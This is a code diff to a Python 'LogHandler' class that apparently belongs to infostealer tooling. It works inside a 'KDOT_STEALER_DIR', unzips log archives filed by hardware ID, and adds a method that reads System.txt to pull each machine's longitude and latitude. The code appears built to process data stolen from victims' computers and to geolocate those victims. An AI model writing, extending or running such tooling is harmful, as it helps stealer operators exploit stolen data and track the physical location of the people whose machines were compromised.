@@ -34,6 +34,7 @@ class LogHandler:
 
         self.HWID_folder_dir = os.path.join(self.KDOT_STEALER_DIR, self.file_hwid)
         self.HWID_path_expected = os.path.join(self.HWID_folder_dir, self.file_name)
+        self.extracted_folder_name = ""
 
         logging.info(f"LogHandler initialized with file: {self.file_name}")
 
@@ -74,6 +75,7 @@ class LogHandler:
             with open(self.HWID_path_expected, "rb") as f:
                 with zipfile.ZipFile(f, "r") as zip_ref:
                     zip_ref.extractall(self.HWID_folder_dir)
+                    self.extracted_folder_name = zip_ref.namelist()[0].split("/")[0]
             os.remove(self.HWID_path_expected)
         except Exception as e:
             logging.critical(
@@ -81,3 +83,28 @@ class LogHandler:
             )
             return False
         return True
+
+    def get_longitude_latitude(self) -> tuple:
+        """Gets the longitude and latitude of the location.
+
+        Returns:
+            tuple: Returns the longitude and latitude of the location.
+        """
+
+        with open(
+            os.path.join(
+                self.HWID_folder_dir,
+                self.extracted_folder_name,
+                "System.txt",
+            ),
+            "r",
+            encoding="utf-8",
+            errors="ignore",
+        ) as f:
+            lines = f.readlines()
+            for line in lines:
+                if "Longitude" in line:
+                    longitude = line.split(":")[1].strip()
+                if "Latitude" in line:
+                    latitude = line.split(":")[1].strip()
+        return longitude, latitude
